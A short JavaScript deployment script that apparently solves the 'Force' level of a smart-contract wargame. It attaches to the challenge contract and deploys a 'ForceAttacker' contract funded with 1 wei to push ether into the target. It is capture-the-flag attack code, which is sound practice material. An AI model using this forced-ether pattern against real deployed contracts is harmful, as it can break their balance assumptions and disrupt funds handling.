const {FORCE_INSTANCE_ADDRESS} = require('./utils');

async function main() {
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
    console.log('Force level');

    if (!FORCE_INSTANCE_ADDRESS) {
        console.log('Force instance address not found');
        return;
    }

    console.log('Force instance address', FORCE_INSTANCE_ADDRESS);

    const factory = await ethers.getContractFactory("Force");
    const contract = factory.attach(FORCE_INSTANCE_ADDRESS);

    const attackerFactory = await ethers.getContractFactory("ForceAttacker");
    const attackerContract = await attackerFactory.deploy(contract.address, {value: 1});
    await attackerContract.deployed();

    console.log('\x1b[32m%s\x1b[0m', 'Force level. Done !!!');
    console.log('\x1b[33m%s\x1b[0m', '* * * * * * * * * * * * * * * ');
}

module.exports = main;
